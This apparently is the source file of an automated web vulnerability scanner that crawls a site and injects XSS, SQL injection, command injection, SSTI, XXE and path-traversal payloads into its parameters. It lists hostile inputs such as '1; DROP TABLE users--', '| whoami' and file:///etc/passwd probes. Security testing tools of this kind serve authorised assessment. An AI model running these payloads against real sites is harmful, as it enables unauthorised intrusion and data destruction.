# core/intelligent_scanner.py
from typing import Dict, List, Optional, Set, Tuple
from dataclasses import dataclass, field
from enum import Enum
import re
from collections import defaultdict
import threading
import time
import hashlib
from urllib.parse import urlparse, urljoin, parse_qs


class ParameterType(Enum):
    STRING = "string"
    INTEGER = "integer"
    BOOLEAN = "boolean"
    DATE = "date"
    EMAIL = "email"
    URL = "url"
    FILE = "file"
    UNKNOWN = "unknown"


class VulnerabilityConfidence(Enum):
    CONFIRMED = 1.0
    HIGH = 0.9
    MEDIUM = 0.7
    LOW = 0.5
    UNLIKELY = 0.2


@dataclass
class Parameter:
    name: str
    value: str
    param_type: ParameterType
    location: str
    url: str
    possible_injection_points: List[str] = field(default_factory=list)


@dataclass
class SiteMap:
    urls: Set[str] = field(default_factory=set)
    parameters: Dict[str, List[Parameter]] = field(default_factory=lambda: defaultdict(list))
    forms: List[Dict] = field(default_factory=list)
    patterns: Dict[str, str] = field(default_factory=dict)


class ParameterAnalyzer:
    @staticmethod
    def detect_parameter_type(value: str) -> ParameterType:
        if not value:
            return ParameterType.UNKNOWN
        
        if re.match(r'^\d+$', value):
            return ParameterType.INTEGER
        
        if re.match(r'^(true|false)$', value, re.IGNORECASE):
            return ParameterType.BOOLEAN
        
        if re.match(r'^\d{4}-\d{2}-\d{2}', value):
            return ParameterType.DATE
        
        if re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', value):
            return ParameterType.EMAIL
        
        if re.match(r'^https?://', value):
            return ParameterType.URL
        
        if re.match(r'^[a-zA-Z0-9._-]+\.(jpg|png|pdf|doc|txt)$', value):
            return ParameterType.FILE
        
        return ParameterType.STRING
    
    @staticmethod
    def get_injection_points(param: Parameter) -> List[str]:
        points = []
        param_type = param.param_type
        
        if param_type == ParameterType.INTEGER:
            points = ['0', '-1', '99999', '1 OR 1=1', '1; DROP TABLE users--']
        
        elif param_type == ParameterType.STRING:
            points = ['', "' OR '1'='1", '"OR"1"="1', '<script>alert(1)</script>']
        
        elif param_type == ParameterType.BOOLEAN:
            points = ['true', 'false', '1', '0']
        
        elif param_type == ParameterType.EMAIL:
            points = ['admin@example.com', "' OR '1'='1@example.com"]
        
        elif param_type == ParameterType.URL:
            points = ['http://localhost', 'http://127.0.0.1', 'file:///etc/passwd']
        
        elif param_type == ParameterType.FILE:
            points = ['../../../../etc/passwd', '..\\..\\..\\windows\\win.ini']
        
        return points


class PayloadGenerator:
    XSS_PAYLOADS = {
        'context_html': [
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '"><script>alert(1)</script>',
        ],
        'context_attribute': [
            '" onmouseover="alert(1)' ,
            "' onmouseover='alert(1)",
        ],
        'context_javascript': [
            '";alert(1);"',
            "';alert(1);'",
        ]
    }
    
    SQL_PAYLOADS = {
        'integer': [
            " OR 1=1--",
            " AND 1=2 UNION SELECT 1,2,3--",
            " AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
        ],
        'string': [
            "' OR '1'='1",
            "' UNION SELECT 1,2,3--",
            "' AND SLEEP(5)--",
        ]
    }
    
    RCE_PAYLOADS = {
        'linux': [
            "; id;",
            "| whoami",
            "` whoami `",
        ],
        'windows': [
            "; dir;",
            "| whoami",
        ]
    }
    
    @staticmethod
    def generate_payloads(param: Parameter, vulnerability_type: str) -> List[str]:
        payloads = []
        param_type = param.param_type.value
        
        if vulnerability_type == 'XSS':
            for context, context_payloads in PayloadGenerator.XSS_PAYLOADS.items():
                payloads.extend(context_payloads)
        
        elif vulnerability_type == 'SQL':
            key = 'integer' if param_type == 'integer' else 'string'
            payloads = PayloadGenerator.SQL_PAYLOADS.get(key, [])
        
        elif vulnerability_type == 'RCE':
            os_type = 'linux' if '/' in param.value else 'windows'
            payloads = PayloadGenerator.RCE_PAYLOADS.get(os_type, [])
        
        elif vulnerability_type == 'SSTI':
            payloads = [
                '{{7*7}}', '${7*7}', '<%=7*7%>',
                '#{7*7}', '{7*7}', '[=7*7=]'
            ]
        
        elif vulnerability_type == 'XXE':
            payloads = [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
            ]
        
        return payloads


class ResponseAnalyzer:
    @staticmethod
    def calculate_response_hash(content: str) -> str:
        return hashlib.md5(content.encode()).hexdigest()
    
    @staticmethod
    def detect_injection_success(
        original_response: str,
        injected_response: str,
        payload: str,
        vuln_type: str
    ) -> Tuple[bool, float]:
        
        if original_response == injected_response:
            return False, 0.0
        
        if vuln_type == 'XSS':
            if payload in injected_response or '<script>' in injected_response:
                return True, 0.95
            
            if len(injected_response) > len(original_response) * 1.5:
                return True, 0.7
        
        elif vuln_type == 'SQL':
            error_patterns = [
                r'SQL syntax',
                r'MySQL',
                r'PostgreSQL',
                r'ORA-',
                r'SQLSTATE',
                r'Unclosed quotation',
            ]
            
            for pattern in error_patterns:
                if re.search(pattern, injected_response, re.IGNORECASE):
                    return True, 0.9
            
            if ' UNION SELECT ' in payload and len(injected_response) != len(original_response):
                return True, 0.8
        
        elif vuln_type == 'RCE':
            rce_indicators = [
                r'uid=\d+',
                r'gid=\d+',
                r'root:',
                r'C:\\',
                r'Windows',
            ]
            
            for indicator in rce_indicators:
                if re.search(indicator, injected_response):
                    return True, 0.95
        
        elif vuln_type == 'SSTI':
            if '49' in injected_response or '7777777' in injected_response:
                return True, 0.95
        
        elif vuln_type == 'XXE':
            if 'root:' in injected_response or '/bin/bash' in injected_response:
                return True, 0.95
        
        response_diff = abs(len(injected_response) - len(original_response))
        if response_diff > 100:
            return True, 0.6
        
        return False, 0.0
    
    @staticmethod
    def extract_evidence(response: str, payload: str) -> str:
        lines = response.split('\n')
        for i, line in enumerate(lines):
            if len(line) > 50:
                return line[:100]
        
        return response[:200]


class SiteMapper:
    def __init__(self, session, timeout=10):
        self.session = session
        self.timeout = timeout
        self.site_map = SiteMap()
    
    def crawl_site(self, base_url: str, max_pages: int = 50) -> SiteMap:
        visited = set()
        to_visit = [base_url]
        base_domain = urlparse(base_url).netloc
        
        while to_visit and len(visited) < max_pages:
            url = to_visit.pop(0)
            
            if url in visited:
                continue
            
            if urlparse(url).netloc != base_domain:
                continue
            
            try:
                response = self.session.get(url, timeout=self.timeout)
                visited.add(url)
                self.site_map.urls.add(url)
                
                self._extract_parameters(url, response.text)
                self._extract_links(response.text, base_url, to_visit, base_domain)
                
            except Exception:
                pass
        
        return self.site_map
    
    def _extract_parameters(self, url: str, content: str):
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        for name, values in params.items():
            for value in values:
                param_type = ParameterAnalyzer.detect_parameter_type(value)
                param = Parameter(
                    name=name,
                    value=value,
                    param_type=param_type,
                    location='query',
                    url=url
                )
                param.possible_injection_points = ParameterAnalyzer.get_injection_points(param)
                self.site_map.parameters[name].append(param)
        
        form_pattern = r'<form[^>]*>(.*?)</form>'
        for form_match in re.finditer(form_pattern, content, re.DOTALL):
            form_content = form_match.group(1)
            input_pattern = r'<input[^>]*name=["\']?([a-zA-Z0-9_-]+)["\']?[^>]*value=["\']?([^"\']*)["\']?'
            
            for input_match in re.finditer(input_pattern, form_content):
                name = input_match.group(1)
                value = input_match.group(2) or ''
                param_type = ParameterAnalyzer.detect_parameter_type(value)
                param = Parameter(
                    name=name,
                    value=value,
                    param_type=param_type,
                    location='post',
                    url=url
                )
                self.site_map.parameters[name].append(param)
    
    def _extract_links(self, content: str, base_url: str, to_visit: list, base_domain: str):
        link_pattern = r'href=["\']?([^"\'>\s]+)["\']?'
        for match in re.finditer(link_pattern, content):
            link = match.group(1)
            absolute_url = urljoin(base_url, link)
            
            if urlparse(absolute_url).netloc == base_domain:
                to_visit.append(absolute_url)


class IntelligentScanner:
    def __init__(self, session, timeout=10):
        self.session = session
        self.timeout = timeout
        self.site_map = None
    
    def scan_intelligent(self, base_url: str, max_pages: int = 50) -> List[Dict]:
        vulnerabilities = []
        
        print("📡 Stage 1: Site Mapping...")
        mapper = SiteMapper(self.session, self.timeout)
        self.site_map = mapper.crawl_site(base_url, max_pages)
        print(f"✅ Found {len(self.site_map.urls)} URLs")
        print(f"✅ Found {len(self.site_map.parameters)} unique parameters")
        
        print("\n🔍 Stage 2: Intelligent Payload Testing...")
        vulnerability_types = ['XSS', 'SQL', 'SSTI', 'RCE']
        
        for param_name, params in self.site_map.parameters.items():
            if not params:
                continue
            
            param = params[0]
            
            for vuln_type in vulnerability_types:
                payloads = PayloadGenerator.generate_payloads(param, vuln_type)
                
                for payload in payloads:
                    vuln = self._test_payload(param, payload, vuln_type)
                    if vuln:
                        vulnerabilities.append(vuln)
        
        return vulnerabilities
    
    def _test_payload(self, param: Parameter, payload: str, vuln_type: str) -> Optional[Dict]:
        try:
            original_url = param.url
            modified_url = original_url.replace(f"{param.name}={param.value}", f"{param.name}={payload}")
            
            original_response = self.session.get(original_url, timeout=self.timeout).text
            injected_response = self.session.get(modified_url, timeout=self.timeout).text
            
            is_vulnerable, confidence = ResponseAnalyzer.detect_injection_success(
                original_response,
                injected_response,
                payload,
                vuln_type
            )
            
            if is_vulnerable and confidence > 0.5:
                evidence = ResponseAnalyzer.extract_evidence(injected_response, payload)
                
                return {
                    'type': vuln_type,
                    'parameter': param.name,
                    'url': param.url,
                    'payload': payload,
                    'confidence': confidence,
                    'evidence': evidence
                }
        
        except Exception:
            pass
        
        return None
